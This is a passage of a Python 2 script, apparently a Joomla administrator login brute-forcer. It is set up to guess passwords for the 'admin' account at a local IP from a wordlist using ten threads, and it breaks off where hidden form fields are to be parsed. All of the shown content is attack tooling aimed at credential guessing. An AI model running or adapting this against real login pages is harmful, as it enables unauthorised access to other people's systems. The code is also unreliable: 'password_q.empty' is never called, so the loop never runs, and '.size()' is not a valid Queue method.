import Queue
import threading
import urllib
import urllib2
import cookielib
import sys

from HTMLParser import HTMLParser

user_thread = 10
username = "admin"
wordlist_file = "tmp/dictionary.txt"
resume = None

target_url = "http://192.168.0.1/administrator/index.php"
target_post = "http://192.168.0.1/administrator/index.php"

# based on evaluated variables
username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


class Bruter(object):
    def __init__(self, username, words):

        self.username = username
        self.password_q = words
        self.found = False

        print("Setup complete for: %s" % username)

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print("Attempting: %s : %s (%d left)" % (self.username, brute,
                                                      self.password_q.size()))

            # parse hidden fields
